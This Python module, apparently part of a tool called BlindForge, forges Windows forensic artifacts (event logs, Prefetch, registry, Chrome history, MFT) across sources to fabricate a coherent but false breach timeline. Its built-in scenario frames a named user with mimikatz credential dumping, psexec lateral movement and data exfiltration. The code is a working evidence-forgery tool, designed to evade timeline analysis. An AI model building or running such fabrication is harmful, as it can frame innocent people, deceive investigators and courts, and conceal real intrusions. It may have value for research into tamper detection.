"""
BlindForge Timeline Warp — Cross-source timeline poisoning orchestrator.

Coordinates injection across MFT, EVTX, Prefetch, Registry, and SQLite
to build a coherent but fabricated forensic narrative. Ensures timestamps
are internally consistent across artifact types to survive timeline
analysis tools like Plaso/log2timeline.
"""

import os
from datetime import datetime, timedelta, timezone
from typing import Optional
from dataclasses import dataclass, field

from .mft_injector import MFTInjector, MFTRecord
from .evtx_injector import (
    EVTXInjector,
    logon_event_4624,
    process_creation_4688,
    service_install_7045,
    create_empty_evtx,
)
from .prefetch_forge import PrefetchForge
from .registry_forge import RegistryForge, UserAssistEntry, ShimCacheEntry
from .sqlite_poisoner import ChromePoisoner, create_chrome_history_db


@dataclass
class TimelineEvent:
    """A single event in the fabricated timeline."""
    timestamp: datetime
    event_type: str  # "logon", "process", "file_access", "download", "service"
    description: str
    details: dict = field(default_factory=dict)


@dataclass
class AttackNarrative:
    """A complete fabricated attack story with cross-source consistency."""
    name: str
    target_user: str
    target_computer: str
    source_ip: str
    events: list[TimelineEvent] = field(default_factory=list)

    def add_logon(self, timestamp: datetime, logon_type: int = 10) -> None:
        self.events.append(TimelineEvent(
            timestamp=timestamp,
            event_type="logon",
            description=f"RDP logon as {self.target_user} from {self.source_ip}",
            details={"logon_type": logon_type, "username": self.target_user},
        ))

    def add_process(
        self, timestamp: datetime, process: str, cmdline: str, parent: str = ""
    ) -> None:
        self.events.append(TimelineEvent(
            timestamp=timestamp,
            event_type="process",
            description=f"Executed {process}",
            details={
                "process": process,
                "cmdline": cmdline,
                "parent": parent or "C:\\Windows\\explorer.exe",
            },
        ))

    def add_file_access(
        self, timestamp: datetime, filename: str, content: bytes = b""
    ) -> None:
        self.events.append(TimelineEvent(
            timestamp=timestamp,
            event_type="file_access",
            description=f"Accessed {filename}",
            details={"filename": filename, "content": content},
        ))

    def add_download(
        self, timestamp: datetime, url: str, target_path: str, title: str = ""
    ) -> None:
        self.events.append(TimelineEvent(
            timestamp=timestamp,
            event_type="download",
            description=f"Downloaded from {url}",
            details={"url": url, "target_path": target_path, "title": title},
        ))

    def add_service_install(
        self, timestamp: datetime, service_name: str, image_path: str
    ) -> None:
        self.events.append(TimelineEvent(
            timestamp=timestamp,
            event_type="service",
            description=f"Installed service {service_name}",
            details={"service_name": service_name, "image_path": image_path},
        ))

    def get_sorted_events(self) -> list[TimelineEvent]:
        return sorted(self.events, key=lambda e: e.timestamp)


class TimelineWarp:
    """Orchestrate cross-source artifact injection for a coherent narrative."""

    def __init__(self, output_dir: str):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def materialize(self, narrative: AttackNarrative) -> dict:
        """Convert a narrative into actual forensic artifacts across all sources."""
        results = {}
        events = narrative.get_sorted_events()

        # 1. EVTX — Security event log
        evtx_path = os.path.join(self.output_dir, "Security.evtx")
        evtx_data = create_empty_evtx()
        with open(evtx_path, "wb") as f:
            f.write(evtx_data)
        evtx_injector = EVTXInjector(evtx_path)
        evtx_injector.load()

        record_id = 1
        for event in events:
            if event.event_type == "logon":
                rec = logon_event_4624(
                    record_id=record_id,
                    timestamp=event.timestamp,
                    username=event.details.get("username", narrative.target_user),
                    source_ip=narrative.source_ip,
                    computer=narrative.target_computer,
                    logon_type=event.details.get("logon_type", 10),
                )
                evtx_injector.inject_record(rec)
                record_id += 1
            elif event.event_type == "process":
                rec = process_creation_4688(
                    record_id=record_id,
                    timestamp=event.timestamp,
                    process_name=event.details["process"],
                    command_line=event.details["cmdline"],
                    parent_process=event.details.get("parent", ""),
                    username=narrative.target_user,
                    computer=narrative.target_computer,
                )
                evtx_injector.inject_record(rec)
                record_id += 1
            elif event.event_type == "service":
                rec = service_install_7045(
                    record_id=record_id,
                    timestamp=event.timestamp,
                    service_name=event.details["service_name"],
                    image_path=event.details["image_path"],
                    computer=narrative.target_computer,
                )
                evtx_injector.inject_record(rec)
                record_id += 1

        evtx_injector.save()
        results["evtx"] = evtx_path

        # 2. Prefetch — Program execution evidence
        prefetch_dir = os.path.join(self.output_dir, "Prefetch")
        forge = PrefetchForge(prefetch_dir)
        process_events = [e for e in events if e.event_type == "process"]

        prefetch_files = []
        for event in process_events:
            proc_path = event.details["process"]
            proc_name = os.path.basename(proc_path).upper()
            vol_path = proc_path.replace("C:\\", "\\VOLUME{01d7a8b9c0d1e2f3}\\").replace("\\", "\\")
            pf_path = forge.forge_execution(
                executable_name=proc_name,
                executable_path=vol_path,
                last_run=event.timestamp,
            )
            prefetch_files.append(pf_path)

        results["prefetch"] = prefetch_files

        # 3. Registry — UserAssist + ShimCache
        reg_dir = os.path.join(self.output_dir, "Registry")
        reg_forge = RegistryForge(reg_dir)

        executed_programs = [
            {
                "path": e.details["process"],
                "run_time": e.timestamp,
                "run_count": 1,
            }
            for e in process_events
        ]

        file_events = [e for e in events if e.event_type == "file_access"]
        accessed_files = [
            {
                "filename": e.details["filename"],
                "extension": os.path.splitext(e.details["filename"])[1],
            }
            for e in file_events
        ]

        reg_results = reg_forge.forge_full_attack_evidence(executed_programs, accessed_files)
        results["registry"] = reg_results

        # 4. Chrome History — Browser activity
        download_events = [e for e in events if e.event_type == "download"]
        if download_events:
            chrome_db = os.path.join(self.output_dir, "History")
            create_chrome_history_db(chrome_db)
            chrome = ChromePoisoner(chrome_db)

            for event in download_events:
                chrome.inject_visit(
                    url=event.details["url"],
                    title=event.details.get("title", ""),
                    visit_time=event.timestamp,
                    typed_count=1,
                    transition=1,
                )
                chrome.inject_download(
                    url=event.details["url"],
                    target_path=event.details["target_path"],
                    start_time=event.timestamp,
                )

            results["chrome_history"] = chrome_db

        # 5. MFT — File creation evidence
        if file_events:
            from .mft_injector import create_empty_mft
            mft_path = os.path.join(self.output_dir, "$MFT")
            mft_data = create_empty_mft(256)
            with open(mft_path, "wb") as f:
                f.write(mft_data)
            mft_injector = MFTInjector(mft_path)
            mft_injector.load()

            for event in file_events:
                mft_injector.inject_ghost_file(
                    filename=event.details["filename"],
                    created=event.timestamp - timedelta(days=30),
                    modified=event.timestamp,
                    accessed=event.timestamp,
                    content=event.details.get("content", b""),
                )

            mft_injector.save()
            results["mft"] = mft_path

        return results

    def generate_timeline_report(self, narrative: AttackNarrative) -> str:
        """Generate a human-readable timeline report."""
        lines = [
            f"# BlindForge Timeline Report: {narrative.name}",
            f"Target: {narrative.target_user}@{narrative.target_computer}",
            f"Source: {narrative.source_ip}",
            "",
            "## Fabricated Timeline",
            "",
        ]
        for event in narrative.get_sorted_events():
            ts = event.timestamp.strftime("%Y-%m-%d %H:%M:%S UTC")
            lines.append(f"[{ts}] [{event.event_type.upper():12s}] {event.description}")

        lines.extend([
            "",
            "## Artifact Sources",
            "- EVTX: Security.evtx (logon, process, service events)",
            "- Prefetch: Windows\\Prefetch\\ (program execution)",
            "- Registry: NTUSER.DAT (UserAssist, ShimCache, RecentDocs)",
            "- Chrome: History (browser visits, downloads)",
            "- MFT: $MFT (file creation timestamps)",
            "",
            "## IMPORTANT",
            "ALL events above are FABRICATED. None of this activity occurred.",
            "Cross-source consistency makes detection extremely difficult.",
        ])

        report = "\n".join(lines)
        report_path = os.path.join(self.output_dir, "timeline_report.md")
        with open(report_path, "w") as f:
            f.write(report)
        return report_path


def build_data_breach_narrative(
    target_user: str = "jdoe",
    target_computer: str = "WORKSTATION-01",
    source_ip: str = "10.0.0.55",
    start_time: Optional[datetime] = None,
) -> AttackNarrative:
    """Pre-built narrative: corporate data breach via RDP."""
    if start_time is None:
        start_time = datetime(2026, 6, 15, 2, 30, 0, tzinfo=timezone.utc)

    narrative = AttackNarrative(
        name="Corporate Data Breach via RDP",
        target_user=target_user,
        target_computer=target_computer,
        source_ip=source_ip,
    )

    t = start_time

    # Phase 1: Initial Access
    narrative.add_logon(t, logon_type=10)

    # Phase 2: Discovery
    t += timedelta(minutes=1)
    narrative.add_process(t, "C:\\Windows\\System32\\whoami.exe", "whoami /all")

    t += timedelta(seconds=15)
    narrative.add_process(t, "C:\\Windows\\System32\\net.exe", "net user /domain")

    t += timedelta(seconds=30)
    narrative.add_process(t, "C:\\Windows\\System32\\ipconfig.exe", "ipconfig /all")

    # Phase 3: Credential Theft
    t += timedelta(minutes=2)
    narrative.add_process(
        t,
        "C:\\Users\\jdoe\\Desktop\\mimikatz.exe",
        "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
    )

    # Phase 4: Lateral Movement
    t += timedelta(minutes=3)
    narrative.add_process(
        t,
        "C:\\Windows\\Temp\\psexec.exe",
        "psexec.exe \\\\DC01 cmd.exe",
    )

    # Phase 5: Data Access
    t += timedelta(minutes=2)
    narrative.add_file_access(t, "credentials.xlsx")
    t += timedelta(seconds=30)
    narrative.add_file_access(t, "employee_database.csv")
    t += timedelta(seconds=45)
    narrative.add_file_access(t, "financial_report_2026.pdf")

    # Phase 6: Data Exfiltration
    t += timedelta(minutes=5)
    narrative.add_download(
        t,
        url="https://mega.nz/folder/exfil-upload",
        target_path="C:\\Users\\jdoe\\Downloads\\mega_upload.exe",
        title="MEGA Upload Tool",
    )

    t += timedelta(minutes=2)
    narrative.add_process(
        t,
        "C:\\Windows\\System32\\rar.exe",
        'rar.exe a -hp"password123" C:\\Users\\jdoe\\exfil.rar C:\\sensitive_data\\',
    )

    # Phase 7: Persistence
    t += timedelta(minutes=3)
    narrative.add_service_install(
        t,
        service_name="WindowsUpdateHelper",
        image_path="C:\\Windows\\Temp\\svchost_update.exe",
    )

    return narrative


if __name__ == "__main__":
    import tempfile

    print("[BlindForge] Timeline Warp — Cross-Source Narrative Fabrication PoC")
    print("=" * 70)

    output_dir = os.path.join(tempfile.gettempdir(), "timeline_warp")
    warp = TimelineWarp(output_dir)

    narrative = build_data_breach_narrative()
    print(f"\n[*] Building narrative: {narrative.name}")
    print(f"    Target: {narrative.target_user}@{narrative.target_computer}")
    print(f"    Source: {narrative.source_ip}")
    print(f"    Events: {len(narrative.events)}")

    results = warp.materialize(narrative)
    report = warp.generate_timeline_report(narrative)

    print(f"\n[+] Generated artifacts:")
    for artifact_type, path in results.items():
        if isinstance(path, list):
            print(f"    {artifact_type}: {len(path)} files")
        else:
            print(f"    {artifact_type}: {path}")

    print(f"\n[+] Timeline report: {report}")

    print("\n[+] Timeline of fabricated events:")
    for event in narrative.get_sorted_events():
        ts = event.timestamp.strftime("%H:%M:%S")
        print(f"    [{ts}] {event.description}")

    print(f"\n[+] All artifacts in: {output_dir}")
    print("[!] This is a COMPLETE fabricated attack narrative across 5 artifact sources.")
    print("[!] Plaso/log2timeline will reconstruct a coherent breach that never happened.")
